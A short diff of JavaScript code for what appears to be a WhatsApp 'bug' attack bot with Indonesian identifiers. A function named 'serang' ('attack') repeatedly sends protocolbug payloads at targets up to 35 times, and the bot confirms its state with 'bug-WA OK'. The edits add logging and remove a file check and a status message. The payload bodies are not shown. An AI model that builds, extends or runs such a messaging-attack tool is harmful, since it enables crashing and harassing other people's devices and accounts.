@@ -340,6 +340,7 @@ function serang(targets) {
       await protocolbug5(targets);
       await tunggu(1500);
       await protocolbug3(targets);
+      console.log("serangan ke-" + i);
       if (i == 35) {
         resolve();
       }
@@ -440,10 +441,7 @@ async function bot(session) {
           await Promise.all(tasks);
         };
       });*/
-    if (!fs.existsSync("./data.json")) {
-      console.error("data.json tidak ditemukan");
-      process.exit(1);
-    }
+
     blob = JSON.parse(fs.readFileSync("./data.json", "utf-8"));
     nomorRequest = blob.session.creds.me.id.split(":")[0];
     session = reviveBuffer(blob.session);
@@ -502,9 +500,6 @@ async function bot(session) {
       clearTimeout(exec);
       console.log("Terhubung " + new Date().toLocaleString("id-ID"));
       sendMsg = sock.relayMessage;
-      await sock.sendMessage(nomorRequest + "@s.whatsapp.net", {
-        text: "bug-WA OK"
-      });
       start();
     }
   });
@@ -520,7 +515,9 @@ async function bot(session) {
       fs.writeFileSync("./data.json", JSON.stringify(blob), null, 2);
     }
   });
+
   sock.ev.on("messages.upsert", ({ messages }) => {
+    console.log(messages);
     messages.forEach(async e => {
       if (e.key.remoteJid === nomorRequest + "@s.whatsapp.net" && e.key.fromMe === true) {
         const pesanMasuk = e.message?.extendedTextMessage?.text;
